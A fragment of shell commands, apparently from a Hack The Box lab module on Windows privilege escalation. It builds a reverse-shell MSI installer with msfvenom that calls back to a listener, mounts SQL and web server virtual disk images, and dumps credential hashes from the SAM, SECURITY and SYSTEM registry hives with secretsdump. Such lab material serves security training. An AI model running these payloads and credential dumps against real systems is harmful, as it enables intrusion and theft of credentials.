...
```shell-session
swmpdnky@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
...
```shell-session
swmpdnky@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```
...
```shell-session
swmpdnky@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```
...
```shell-session
swmpdnky@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
